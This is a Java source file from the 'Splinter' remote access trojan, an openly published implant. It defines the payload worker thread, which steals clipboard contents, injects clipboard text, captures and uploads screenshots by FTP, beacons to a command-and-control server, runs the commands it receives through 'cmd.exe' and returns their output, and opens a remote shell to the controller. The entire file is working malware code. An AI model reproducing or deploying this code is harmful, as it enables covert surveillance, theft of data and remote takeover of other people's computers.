/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/



package Implant.Payloads;

import Controller.Drivers.Drivers;
import Controller.Thread.Thread_Terminal;
import Implant.Driver;
import Implant.FTP.FTP_ServerSocket;
import Implant.FTP.FTP_Thread_Sender;
import Implant.FTP.IncrementObject;
import Implant.ProcessHandlerThread;
import Implant.Splinter_IMPLANT;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.ConnectException;
import java.net.Socket;
import java.util.ArrayList;
import javax.swing.Timer;

public class Worker_Thread_Payloads extends Thread
  implements Runnable, ActionListener
{
  public static final String strMyClassName = "Worker_Thread_Payloads";
  Timer tmrInterrupt = null;
  int timerInterrupt_millis = 1000;

  public boolean killThisThread = false;

  Splinter_IMPLANT implant = null;

  boolean dismissInterrupt = false;

  public int payload_execution_index = 0;
  public static final int PAYLOAD_CLIPBOARD_EXTRACTION = 0;
  public static final int PAYLOAD_CLIPBOARD_INJECTION = 1;
  public static final int PAYLOAD_RECORD_SCREEN = 2;
  public static final int PAYLOAD_BEACON_TO_CONTROLLER = 3;
  public static final int PAYLOAD_RENDER_SCREEN = 4;
  public static final String[] arrPayloadTypes = { 
    "CLIPBOARD EXTRACTION", 
    "CLIPBOARD INJECTION", 
    "RECORD SCREEN", 
    "BEACON TO CONTROLLER", 
    "RENDER SCREEN" };

  public static volatile boolean TERMINATE_ALL_WORKERS_CLIPBOARD = false;
  public static volatile boolean TERMINATE_ALL_WORKERS_RECORD_SCREEN = false;
  public static volatile boolean TERMINATE_ALL_WORKERS_BEACON_TO_CONTROLLER = false;
  public static volatile boolean TERMINATE_ALL_WORKERS_RENDER_SCREEN = false;

  public ArrayList<String> alCommands = new ArrayList();

  public String payloadType = "";

  public String prev_ClipboardContents = ""; public String curr_ClipboardContents = ""; public String text_to_inject_into_clipboard = "";

  public String controllerAddress = "";
  public int controllerPort = 1;

  public String myUniqueConfirmationID = "";
  int numEntriesBufferedFromCommands = 0;
  Splinter_IMPLANT shell = null;

  public File fleRenderDirectory = null;
  public Frame_Render_Captured_Screen screenRecord = null;
  public Thread_Terminal myTerminal = null;

  public Worker_Thread_Payloads(int timing_millis, Splinter_IMPLANT agent, int payload_index, String clipboard_injection_text, String addr_controller, int port_controller, File directoryToRendor)
  {
    try
    {
      if (timing_millis < 100) {
        timing_millis = 100;
      }
      if (clipboard_injection_text == null) {
        clipboard_injection_text = "";
      }
      this.implant = agent;
      this.timerInterrupt_millis = timing_millis;
      this.payload_execution_index = payload_index;
      this.payloadType = arrPayloadTypes[payload_index];
      this.text_to_inject_into_clipboard = clipboard_injection_text;
      this.fleRenderDirectory = directoryToRendor;

      this.controllerAddress = addr_controller;
      this.controllerPort = port_controller;

      this.killThisThread = false;
      this.dismissInterrupt = false;

      if ((payload_index == 0) || (payload_index == 1))
      {
        TERMINATE_ALL_WORKERS_CLIPBOARD = false;
      }

      if (payload_index == 2)
      {
        TERMINATE_ALL_WORKERS_RECORD_SCREEN = false;
      }

      if (payload_index == 3)
      {
        TERMINATE_ALL_WORKERS_BEACON_TO_CONTROLLER = false;
      }

      if (payload_index == 4)
      {
        TERMINATE_ALL_WORKERS_RENDER_SCREEN = false;
      }

      start();
    }
    catch (Exception e)
    {
      Driver.eop("Null Constructor", "Worker_Thread_Payloads", e, "", false);
      this.killThisThread = true;
    }
  }

  public void run()
  {
    try
    {
      if (!this.killThisThread)
      {
        if (this.payload_execution_index == 3)
        {
          beaconToController(this.controllerAddress, this.controllerPort);
        }

        this.tmrInterrupt = new Timer(this.timerInterrupt_millis, this);
        this.tmrInterrupt.start();

        double interruptDelay = this.timerInterrupt_millis + 0.0D;
        String notification = "\nWorker Thread Started for " + this.payloadType + " interrupt interval: " + interruptDelay / 1000.0D + " second(s)\n";

        sendToController(notification);
        Driver.sop(notification);
      }
      else
      {
        sendToController("UNABLE TO START WORKER THREAD!!!");
      }

    }
    catch (Exception e)
    {
      Driver.eop("run", "Worker_Thread_Payloads", e, "", false);
    }
  }

  public void actionPerformed(ActionEvent ae)
  {
    try
    {
      if (ae.getSource() == this.tmrInterrupt)
      {
        if ((TERMINATE_ALL_WORKERS_CLIPBOARD) && ((this.payload_execution_index == 0) || (this.payload_execution_index == 1)))
        {
          this.killThisThread = true;

          String kill = "* Worker Thread Kill command received for all " + this.payloadType + " payload types.";
          sendToController(kill);
          Driver.sop(kill);
        }

        if ((TERMINATE_ALL_WORKERS_RECORD_SCREEN) && (this.payload_execution_index == 2))
        {
          this.killThisThread = true;

          String kill = "* * Worker Thread Kill command received for all " + this.payloadType + " payload types.";
          sendToController(kill);
          Driver.sop(kill);
        }

        if ((TERMINATE_ALL_WORKERS_BEACON_TO_CONTROLLER) && (this.payload_execution_index == 3))
        {
          this.killThisThread = true;

          String kill = "* * Worker Thread Kill command received for all " + this.payloadType + " payload types.";
          sendToController(kill);
          Driver.sop(kill);
        }

        if ((TERMINATE_ALL_WORKERS_RENDER_SCREEN) && (this.payload_execution_index == 4))
        {
          this.killThisThread = true;

          String kill = "* * Worker Thread Kill command received for all " + this.payloadType + " payload types.";

          Driver.sop(kill);
        }

        if (this.killThisThread)
        {
          String kill = "Kill command confirmed. starving this thread softly...";
          sendToController(kill);
          Driver.sop(kill);
          try
          {
            this.tmrInterrupt.stop();
          }
          catch (Exception localException1)
          {
          }
        }

        if (!this.dismissInterrupt)
        {
          this.dismissInterrupt = true;

          executeAction(this.payload_execution_index);

          this.dismissInterrupt = false;
        }

      }

    }
    catch (Exception e)
    {
      Driver.eop("AE", "Worker_Thread_Payloads", e, e.getLocalizedMessage(), false);
    }
  }

  public boolean executeAction(int execution_index)
  {
    try
    {
      switch (execution_index)
      {
      case 0:
        extract_or_inject_Clipboard("");
        break;
      case 1:
        extract_or_inject_Clipboard(this.text_to_inject_into_clipboard);
        break;
      case 2:
        recordScreen(this.controllerAddress, this.controllerPort);
        break;
      case 3:
        beaconToController(this.controllerAddress, this.controllerPort);
        break;
      case 4:
        scanDirectory_RenderScreen(this.fleRenderDirectory);
        break;
      default:
        Driver.sop("Unknown execution action received in Worker_Thread_Payloads");
        return false;
      }

      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("executionAction", "Worker_Thread_Payloads", e, "", false);
    }

    return false;
  }

  public boolean scanDirectory_RenderScreen(File fleDirectory)
  {
    try
    {
      if ((fleDirectory == null) || (!fleDirectory.exists()) || (!fleDirectory.isDirectory()))
      {
        Driver.sop("INVALID SCREEN DIRECTORY SPECIFIED!!!");
        Driver.sop("I am terminating this Worker thread...");
        this.killThisThread = true;
        return false;
      }

      if (this.killThisThread)
      {
        return false;
      }

      if ((this.screenRecord == null) || (!this.screenRecord.isDisplayable()) || (!this.screenRecord.isShowing()))
      {
        if (this.screenRecord != null)
        {
          try
          {
            this.screenRecord.dispose();
          }
          catch (Exception localException1) {
          }
        }
        try {
          this.screenRecord = new Frame_Render_Captured_Screen("SCREEN SCRAPE - " + this.myTerminal.getChatJListData(), fleDirectory, true, this);
        }
        catch (Exception e)
        {
          Driver.sop("\n* * * * *Attempting alternate screen renderer for screen scrape!!! \n\n");
          this.screenRecord = new Frame_Render_Captured_Screen("* * * SCREEN SCRAPE * * *", fleDirectory, true, this);
        }
        this.screenRecord.myWorkerThread = this;
        this.screenRecord.myTerminal = this.myTerminal;
        this.screenRecord.setVisible(true);
      }
      else
      {
        this.screenRecord.scanDirectory(fleDirectory);
      }

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("scanDirectory_RenderScreen", "Worker_Thread_Payloads", e, "", false);
    }

    return false;
  }

  public boolean beaconToController(String addr, int port)
  {
    try
    {
      if ((this.implant.confirmation_agent_ID_from_CONTROLLER == null) || (this.implant.confirmation_agent_ID_from_CONTROLLER.trim().equals("")))
      {
        registerWithController(addr, port);
      }
      else if (authenticateWithController(addr, port))
      {
        acquireCommandList(addr, port);
      }

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("beaconToController", "Worker_Thread_Payloads", e, "", false);
    }

    return false;
  }

  public boolean authenticateWithController(String addr, int port)
  {
    try
    {
      Driver.sop("\n" + Driver.getTimeStamp_Without_Date() + "  Attempting to establish socket to " + addr + " : " + port + "...");

      this.implant.sktMyConnection = new Socket(addr, port);

      if (this.implant.sktMyConnection == null)
      {
        throw new Exception("null socket returned!. Contact Solo and ref error Code 20130203");
      }

      Driver.sop("Successful connection:  Awaiting registration with controller now...");

      this.implant.listenToSocket(this.implant.sktMyConnection);

      return true;
    }
    catch (ConnectException ee)
    {
      Driver.sop("\nConnection Failed!  Unable to establish socket with " + addr + " : " + port + "\n");
    }
    catch (Exception e)
    {
      Driver.eop("authenticateWithController", "Worker_Thread_Payloads", e, "", true);
    }

    return false;
  }

  public boolean registerWithController(String addr, int port)
  {
    try
    {
      if (this.implant.sktMyConnection != null) {
        try {
          this.implant.sktMyConnection.close();
        }
        catch (Exception localException1)
        {
        }
      }
      Driver.sp("\n" + Driver.getTimeStamp_Without_Date() + " - Attempting to connect to \"" + addr + ":" + port + "\"...");

      if ((addr != null) && (addr.trim().equalsIgnoreCase("localhost")))
      {
        addr = "127.0.0.1";
      }

      boolean success = authenticateWithController(addr, port);

      if (!success)
      {
        return false;
      }

      Driver.sop("Initial registration complete. Registration value: " + this.implant.randomNumberReceived + " awaiting confirmation notification...");

      String confirmation = this.implant.brIn.readLine();

      this.implant.determineCommand(confirmation);

      Driver.sop("Confirmation Complete. ID stored: " + this.implant.confirmation_agent_ID_from_CONTROLLER + "\n");

      this.myUniqueConfirmationID = this.implant.confirmation_agent_ID_from_CONTROLLER;

      this.implant.sktMyConnection.close();

      return true;
    }
    catch (ConnectException ce)
    {
      Driver.sop("Unable to establish connection to \"" + addr + ":" + port + "\".  Sleeping now and upon wake, try connection again...");
    }
    catch (Exception e)
    {
      Driver.eop("registerWithController", "Worker_Thread_Payloads", e, "", false);
    }

    return false;
  }

  public boolean acquireCommandList(String addr, int port)
  {
    try
    {
      Driver.sop("--> Sending request for new command list to controller now...");
      sendToController("REQUEST BEACON COMMAND LIST%%%%%" + this.myUniqueConfirmationID + "#####" + Driver.getHandshakeData("%%%%%"));

      String line = "";
      this.alCommands.clear();
      while (((line = this.implant.brIn.readLine()) != null) && (!line.equals("[END BEACON COMMAND UPDATES]")))
      {
        this.alCommands.add(line);
      }

      if (this.alCommands.size() < 1)
      {
        Driver.sop("No commands received from this beacon");
      }
      else
      {
        Driver.sop(this.alCommands.size() + " commands received from controller. Executing statements now...");
      }

      Driver.sop("Closing Socket...");
      this.implant.sktMyConnection.close();

      if (this.alCommands.size() > 0)
      {
        Driver.sop("Executing received commands...");
        processCommands(this.alCommands, addr, port, true);
      }

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("acquireCommandList", "Worker_Thread_Payloads", e, "", false);
    }

    return false;
  }

  public boolean processCommands(ArrayList<String> commands, String addr, int port, boolean execute_commands_in_series)
  {
    try
    {
      if ((commands == null) || (commands.size() < 1))
      {
        Driver.sop("No commands to process at this time.");
        return true;
      }

      String commandLine = "";
      String[] arrCmd = (String[])null;
      boolean shortcutFound = false;
      ArrayList allCmds = new ArrayList();
      this.numEntriesBufferedFromCommands = 0;
      for (int i = 0; i < commands.size(); i++)
      {
        try
        {
          shortcutFound = false;
          arrCmd = ((String)commands.get(i)).split("%%%%%");

          for (int j = 0; j < Driver.arrShortCuts.length; j++)
          {
            if (Driver.arrShortCuts[j].equalsIgnoreCase(arrCmd[1].trim()))
            {
              shortcutFound = true;
              processShortcut(arrCmd);
            }

          }

          if (!shortcutFound)
          {
            if (execute_commands_in_series)
            {
              ArrayList buffer = bufferCommands(arrCmd[1]);

              if (buffer != null)
              {
                for (int k = 0; k < buffer.size(); k++)
                {
                  allCmds.add((String)buffer.get(k));

                  this.numEntriesBufferedFromCommands += 1;

                  if (this.numEntriesBufferedFromCommands % 2 == 0)
                  {
                    Driver.sp(".");
                  }
                }
              }
            }
            else
            {
              executeCommand(arrCmd[1], addr, port, execute_commands_in_series);
            }

          }

        }
        catch (Exception localException1)
        {
        }

      }

      allCmds.add("[SPLINTER_BEACON_RESPONSE_ALL_DATA_HAS_BEEN_SENT]");

      sendBufferedCommandsToController(allCmds, addr, port);

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("processCommands", "Worker_Thread_Payloads", e, "", false);
    }

    return false;
  }

  public boolean processShortcut(String[] cmd)
  {
    try
    {
      if (cmd == null)
      {
        return false;
      }

      if (cmd.length < 2)
      {
        Driver.sop("invalid shortcut command received!");
        return false;
      }

      if (cmd[1].trim().equalsIgnoreCase("ESTABLISH SHELL"))
      {
        if ((this.shell == null) || (this.shell.sktMyConnection == null) || (this.shell.sktMyConnection.isClosed()))
        {
          Driver.sop("Establishing shell to controller now!");
          this.shell = new Splinter_IMPLANT(this.controllerAddress, this.controllerPort, false, false, 1);
          this.shell.i_am_called_from_beacon_agent = true;
          this.shell.start();
        }
        else
        {
          Driver.sop("\nDISMISSING ESTABLISH SHELL SHORTCUT - SHELL ALREADY ESTABLISHED WITH CONTOLLER\n");
        }

      }
      else
      {
        Driver.sop("Invalid or unsupported shortcut command received!!!");
      }

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("processShortcut", "Worker_Thread_Payloads", e, "", false);
    }

    return false;
  }

  public ArrayList<String> bufferCommands(String command)
  {
    try
    {
      if ((command == null) || (command.trim().equals("")))
      {
        return null;
      }

      Process proc = Runtime.getRuntime().exec("cmd.exe /C " + command, null, Driver.fleCurrentWorkingDirectory);
      BufferedReader brIn_WorkerThread = new BufferedReader(new InputStreamReader(proc.getInputStream()));
      ArrayList alCommandsReceived = ProcessHandlerThread.getBufferedArrayList(brIn_WorkerThread, false);

      if ((alCommandsReceived == null) || (alCommandsReceived.size() < 1))
      {
        alCommandsReceived = new ArrayList();
        alCommandsReceived.add("No process data to return!");
      }

      alCommandsReceived.add(0, "******************************************************************************************************************");
      alCommandsReceived.add(1, "* Implant ID: [" + this.myUniqueConfirmationID + "] \tResponding to command: " + command);
      alCommandsReceived.add(2, "******************************************************************************************************************");

      return alCommandsReceived;
    }
    catch (Exception e)
    {
      Driver.eop("bufferCommands", "Worker_Thread_Payloads", e, "", false);
    }

    return null;
  }

  public boolean sendBufferedCommandsToController(ArrayList<String> alResonseFromCommands, String addr, int port)
  {
    try
    {
      if ((alResonseFromCommands == null) || (alResonseFromCommands.size() < 1))
      {
        return true;
      }

      this.implant.beacon_provide_response = true;

      boolean success = authenticateWithController(addr, port);

      int numLinesSent = 0;

      if (success)
      {
        Driver.sop("Connection appears to be open, attempting to send buffered commands now...");

        sendToController("[[[HANDSHAKE]]]" + Driver.getHandshakeData("%%%%%"));

        for (int i = 0; i < alResonseFromCommands.size(); i++)
        {
          sendToController((String)alResonseFromCommands.get(i));

          numLinesSent++;

          if (numLinesSent % 2 == 0)
          {
            Driver.sp(".");
          }

        }

      }
      else
      {
        Driver.sop("\n NOPE --> DISMISSING COMMAND: UNABLE TO OPEN SOCKET TO CONTROLLER AT " + addr + " : " + port);
      }

      Driver.sop("\nTransmission complete. Closing socket...");

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("sendBufferedCommandsToController", "Worker_Thread_Payloads", e, "", false);
    }

    return false;
  }

  public boolean executeCommand(String command, String addr, int port, boolean executeCommands_in_series)
  {
    try
    {
      if ((command == null) || (command.trim().equals("")))
      {
        return true;
      }

      this.implant.beacon_provide_response = true;

      boolean success = authenticateWithController(addr, port);

      if (success)
      {
        Driver.sop("Connection appears to be open, attempting to execute command: " + command);

        this.implant.sendToController("************************************************************************************ ", false, false);
        this.implant.sendToController("* Responding to command: " + command, false, false);
        this.implant.sendToController("************************************************************************************ ", false, false);

        if (executeCommands_in_series)
        {
          Process proc = Runtime.getRuntime().exec("cmd.exe /C " + command, null, Driver.fleCurrentWorkingDirectory);
          BufferedReader brIn_WorkerThread = new BufferedReader(new InputStreamReader(proc.getInputStream()));
          ArrayList alCommandsReceived = ProcessHandlerThread.getBufferedArrayList(brIn_WorkerThread, false);

          if ((alCommandsReceived == null) || (alCommandsReceived.size() < 1))
          {
            sendToController("No process data to return!");
          }
          else
          {
            for (int i = 0; i < alCommandsReceived.size(); i++)
            {
              this.implant.sendToController((String)alCommandsReceived.get(i), false, false);
            }

          }

        }
        else
        {
          this.implant.executeCommand(command);
        }

      }
      else
      {
        Driver.sop("\nDISMISSING COMMAND: UNABLE TO OPEN SOCKET TO CONTROLLER AT " + addr + " : " + port);
      }

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("executeCommand", "Worker_Thread_Payloads", e, "", false);
    }

    return false;
  }

  public boolean recordScreen(String addr, int port)
  {
    try
    {
      if ((addr == null) || (port < 1))
      {
        sendToController("Terminating record screen payload, invalid FTP address received");
        this.killThisThread = true;
        return false;
      }

      ArrayList alToSend = CaptureScreen.captureScreens(MapSystemProperties.strTEMP, "record");

      if ((alToSend == null) || (alToSend.size() < 1))
      {
        return false;
      }

      IncrementObject statusIncrement = null;
      try { statusIncrement = new IncrementObject(100.0D / alToSend.size()); } catch (Exception e) { statusIncrement = null; }

      for (int i = 0; i < alToSend.size(); i++)
      {
        if ((alToSend.get(i) == null) || (!((File)alToSend.get(i)).exists()) || (!((File)alToSend.get(i)).isFile()) || (alToSend.size() < 1))
        {
          Driver.sop("Empty file received at index " + i + "... skipping this result");
        }
        else
        {
          FTP_Thread_Sender[] arrFTP_Sender = new FTP_Thread_Sender[alToSend.size()];
          arrFTP_Sender[i] = new FTP_Thread_Sender(true, false, addr, port, 4096, (File)alToSend.get(i), this.implant.pwOut, true, FTP_ServerSocket.FILE_TYPE_SCREEN_CAPTURES, statusIncrement);
          arrFTP_Sender[i].start();
        }
      }

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("recordScreen", "Worker_Thread_Payloads", e, "", false);
    }

    return false;
  }

  public boolean extract_or_inject_Clipboard(String injection_text)
  {
    try
    {
      this.curr_ClipboardContents = ClipboardPayload.getClipboardText();

      if (injection_text == null) {
        injection_text = "";
      }

      if (this.prev_ClipboardContents == null)
        this.prev_ClipboardContents = "";
      if (this.curr_ClipboardContents == null) {
        this.curr_ClipboardContents = "";
      }

      if ((this.payload_execution_index == 1) && (!this.curr_ClipboardContents.trim().equals(injection_text)))
      {
        ClipboardPayload.injectClipboard(injection_text);
      }
      else if ((this.curr_ClipboardContents.trim().equals(this.prev_ClipboardContents.trim())) || (this.curr_ClipboardContents.equals(" * --> NO TEXT IN CLIPBOARD AT THIS TIME <-- *")))
      {
        return true;
      }

      if (this.payload_execution_index == 0)
      {
        if (this.implant != null)
        {
          this.implant.sendToController(this.implant.myUniqueDelimiter + "%%%%%" + "RESPONSE_CLIPBOARD" + "%%%%%" + this.curr_ClipboardContents, false, false);
        }

      }

      this.prev_ClipboardContents = this.curr_ClipboardContents;
      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("extract_or_inject_Clipboard", "Worker_Thread_Payloads", e, "", true);
    }

    return false;
  }

  public boolean sendToController(String strToSend)
  {
    try
    {
      if (this.implant != null)
      {
        this.implant.sendToController(strToSend, false, false);
      }

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("sendToController", "Worker_Thread_Payloads", e, e.getLocalizedMessage(), false);
    }

    return false;
  }
}